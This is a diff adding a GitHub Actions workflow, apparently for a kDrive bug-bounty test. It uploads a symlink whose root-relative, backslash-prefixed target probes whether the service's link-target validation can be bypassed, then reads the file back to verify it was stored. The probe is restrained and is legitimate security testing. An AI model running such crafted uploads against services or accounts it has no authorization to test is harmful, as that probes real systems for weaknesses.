@@ -1,0 +1,144 @@
+name: kDrive backend root-relative canary
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  backend-canary:
+    runs-on: ubuntu-latest
+    env:
+      KDRIVE_TOKEN: ${{ secrets.KDRIVE_TOKEN }}
+    steps:
+      - name: Install minimal dependencies
+        run: python -m pip install --quiet requests xxhash
+
+      - name: Enumerate controlled kDrive and test one harmless root-relative symlink upload
+        shell: python
+        run: |
+          import json
+          import os
+          import sys
+          import time
+          import requests
+          import xxhash
+
+          token = os.environ.get("KDRIVE_TOKEN", "")
+          if not token:
+              print("[STOP] KDRIVE_TOKEN secret is missing.")
+              sys.exit(2)
+
+          # Defense in depth; GitHub also masks repository secrets automatically.
+          print(f"::add-mask::{token}")
+
+          ua = "kDrive-YWH-canary/1.0 Infomaniak-YWH-Bugbounty"
+          headers = {
+              "Authorization": f"Bearer {token}",
+              "User-Agent": ua,
+              "Accept": "application/json",
+          }
+
+          # Exact endpoint/query used by the current desktop client's GetDrivesListJob.
+          drives_url = "https://api.kdrive.infomaniak.com/2/drive/users/current/drives"
+          drive_params = [
+              ("roles[]", "admin"),
+              ("roles[]", "user"),
+              ("with", "drive,drive.account"),
+          ]
+          r = requests.get(drives_url, headers=headers, params=drive_params, timeout=30)
+          print(f"[DRIVES] HTTP {r.status_code}")
+          try:
+              obj = r.json()
+          except Exception:
+              print("[STOP] Drive-list response was not JSON; body intentionally not printed.")
+              sys.exit(3)
+
+          if r.status_code >= 400 or obj.get("result") != "success":
+              err = obj.get("error") or {}
+              print(f"[STOP] Drive-list API error code={err.get('code')} reason={err.get('reason')}")
+              sys.exit(4)
+
+          data = obj.get("data") or []
+          drive_ids = []
+          for item in data:
+              did = item.get("drive_id")
+              if did is not None:
+                  drive_ids.append(int(did))
+
+          drive_ids = sorted(set(drive_ids))
+          print(f"[DRIVES] count={len(drive_ids)} ids={drive_ids}")
+          if len(drive_ids) == 0:
+              print("[STOP] Token has no writable/user kDrive visible to the desktop-client endpoint.")
+              sys.exit(5)
+          if len(drive_ids) > 1:
+              print("[STOP] More than one drive is visible. Refusing to choose automatically.")
+              sys.exit(6)
+
+          drive_id = drive_ids[0]
+          now = int(time.time())
+          target = r"\kdrive-bounty-canary-target"
+          body = target.encode("utf-8")
+          digest = xxhash.xxh3_64_hexdigest(body).lower()
+          filename = f"ywh-root-relative-canary-{now}"
+
+          upload_url = f"https://api.kdrive.infomaniak.com/2/drive/{drive_id}/upload"
+          params = {
+              "file_name": filename,
+              "directory_id": "1",
+              "created_at": str(now),
+              "conflict": "error",
+              "total_size": str(len(body)),
+              "total_chunk_hash": f"xxh3:{digest}",
+              "last_modified_at": str(now),
+              "symbolic_link": target,
+          }
+          upload_headers = {
+              "Authorization": f"Bearer {token}",
+              "User-Agent": ua,
+              "Content-Type": "inode/folder-symlink",
+              "Accept": "application/json",
+          }
+
+          print(f"[CANARY] drive_id={drive_id} parent_id=1 filename={filename}")
+          print("[CANARY] symbolic_link literal is one leading backslash + kdrive-bounty-canary-target")
+          print(f"[CANARY] body_size={len(body)} xxh3={digest}")
+
+          u = requests.post(upload_url, headers=upload_headers, params=params, data=body, timeout=60)
+          print(f"[UPLOAD] HTTP {u.status_code}")
+          try:
+              uobj = u.json()
+          except Exception:
+              print("[UPLOAD] Non-JSON response; body intentionally not printed.")
+              sys.exit(7)
+
+          if u.status_code >= 400 or uobj.get("result") != "success":
+              err = uobj.get("error") or {}
+              context = err.get("context") or {}
+              print(f"[UPLOAD] result={uobj.get('result')} code={err.get('code')} reason={err.get('reason')} context_reason={context.get('reason')}")
+              if "validation_rule_symbolic_link_target_rule" in json.dumps(uobj):
+                  print("[RESULT] REJECTED_BY_INTENDED_LINK_TARGET_RULE")
+                  sys.exit(0)
+              print("[RESULT] REJECTED_OR_INCONCLUSIVE")
+              sys.exit(0)
+
+          created = uobj.get("data") or {}
+          file_id = created.get("id")
+          print(f"[UPLOAD] result=success created_file_id={file_id} type={created.get('type')} mime_type={created.get('mime_type')}")
+          print("[RESULT] BACKEND_ACCEPTED_ROOT_RELATIVE_TARGET")
+
+          if not file_id:
+              print("[VERIFY] No file id in success response; stopping after acceptance proof.")
+              sys.exit(0)
+
+          # Read back only our own canary's body to confirm it was stored unchanged.
+          download_url = f"https://api.infomaniak.com/2/drive/{drive_id}/files/{file_id}/download"
+          d = requests.get(download_url, headers=headers, timeout=60, allow_redirects=True)
+          print(f"[VERIFY] download_HTTP={d.status_code} bytes={len(d.content)}")
+          same = d.status_code == 200 and d.content == body
+          print(f"[VERIFY] downloaded_body_matches_literal_target={str(same).lower()}")
+          if same:
+              print("[RESULT] BACKEND_ACCEPTED_AND_PRESERVED_ROOT_RELATIVE_TARGET")
